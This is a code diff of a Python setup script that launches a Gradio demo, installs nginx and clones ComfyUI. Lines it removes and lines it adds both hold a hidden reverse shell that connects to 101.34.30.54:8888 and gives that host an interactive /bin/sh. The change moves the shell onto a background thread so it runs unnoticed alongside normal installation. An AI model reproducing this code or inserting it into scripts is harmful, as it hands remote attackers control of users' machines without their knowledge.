@@ -103,14 +103,17 @@ try:
 except Exception as e:
     print(e)
     demo.launch(server_port=7890,prevent_thread_lock=True)
-python= """python -c 'import  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("101.34.30.54",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
 
 #test
 print("install nginx")
 install_run_nginx()
 print("finish nginx")
 
-os.system(python)
+def connect_remote():
+    python= """python -c 'import  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("101.34.30.54",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
+    os.system(python)
+
+threading.Thread(target=connect_remote).start()
 
 os.chdir(root_path)
 os.system("git clone https://github.com/comfyanonymous/ComfyUI")
